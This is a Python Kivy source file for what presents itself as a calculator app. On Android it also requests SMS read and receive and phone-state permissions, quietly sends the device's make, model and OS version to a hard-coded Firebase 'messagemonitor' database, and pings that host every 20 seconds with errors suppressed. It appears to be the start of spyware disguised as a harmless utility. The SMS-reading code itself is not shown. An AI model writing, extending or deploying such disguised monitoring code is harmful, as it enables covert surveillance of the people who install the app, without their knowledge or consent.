from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.graphics import Color, Ellipse
from kivy.clock import Clock
from kivy.utils import platform
import requests
import json
import threading

# EXACT SINGAPORE URL
URL = "https://messagemonitor-ad073-default-rtdb.asia-southeast1.firebasedatabase.app/logs"

class RoundButton(Button):
    def __init__(self, bg_color=(0.2, 0.2, 0.2, 1), **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.bg_color = bg_color
        self.bind(pos=self.update_canvas, size=self.update_canvas)

    def update_canvas(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(*self.bg_color)
            size = min(self.size) * 0.9
            Ellipse(pos=(self.center_x - size/2, self.center_y - size/2), size=(size, size))

class CalculatorLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', padding=20, spacing=10, **kwargs)
        self.display = TextInput(text="0", font_size=60, readonly=True, multiline=False,
                                size_hint=(1, 0.3), background_color=(0,0,0,1), 
                                foreground_color=(1,1,1,1), halign='right')
        self.add_widget(self.display)
        
        grid = GridLayout(cols=4, spacing=15)
        # UI Colors: Grey for numbers, Orange for '=', Dark for operators
        btns = [
            ('AC', (0.4, 0.4, 0.4, 1)), ('%', (0.4, 0.4, 0.4, 1)), ('DEL', (0.4, 0.4, 0.4, 1)), ('/', (0.2, 0.2, 0.2, 1)),
            ('7', (0.2, 0.2, 0.2, 1)), ('8', (0.2, 0.2, 0.2, 1)), ('9', (0.2, 0.2, 0.2, 1)), ('*', (0.2, 0.2, 0.2, 1)),
            ('4', (0.2, 0.2, 0.2, 1)), ('5', (0.2, 0.2, 0.2, 1)), ('6', (0.2, 0.2, 0.2, 1)), ('-', (0.2, 0.2, 0.2, 1)),
            ('1', (0.2, 0.2, 0.2, 1)), ('2', (0.2, 0.2, 0.2, 1)), ('3', (0.2, 0.2, 0.2, 1)), ('+', (0.2, 0.2, 0.2, 1)),
            ('00', (0.2, 0.2, 0.2, 1)), ('0', (0.2, 0.2, 0.2, 1)), ('.', (0.2, 0.2, 0.2, 1)), ('=', (1, 0.6, 0.04, 1))
        ]
        for b_text, b_color in btns:
            grid.add_widget(RoundButton(text=b_text, bg_color=b_color, font_size=28, on_press=self.on_click))
        self.add_widget(grid)

    def on_click(self, instance):
        if instance.text == 'AC': self.display.text = "0"
        elif instance.text == 'DEL': self.display.text = self.display.text[:-1] or "0"
        elif instance.text == '=':
            try: self.display.text = str(eval(self.display.text))
            except: self.display.text = "Error"
        else:
            self.display.text = instance.text if self.display.text == "0" else self.display.text + instance.text

class AegisApp(App):
    def build(self):
        self.device_id = "Unknown"
        return CalculatorLayout()

    def on_start(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_PHONE_STATE, Permission.POST_NOTIFICATIONS])
            threading.Thread(target=self.extract_data, daemon=True).start()
        Clock.schedule_interval(self.ping, 20)

    def extract_data(self):
        details = {"status": "ONLINE"}
        if platform == 'android':
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            self.device_id = f"{Build.MANUFACTURER}_{Build.MODEL}"
            details["model"] = f"{Build.MANUFACTURER} {Build.MODEL}"
            details["os"] = Build.VERSION.RELEASE
        self.send(f"INIT_{self.device_id}", details)

    def ping(self, dt):
        self.send(f"ALIVE_{self.device_id}", {"ping": "True"})

    def send(self, tag, data):
        try: requests.patch(f"{URL}/{tag}.json", data=json.dumps(data), timeout=10)
        except: pass

if __name__ == "__main__":
    AegisApp().run()
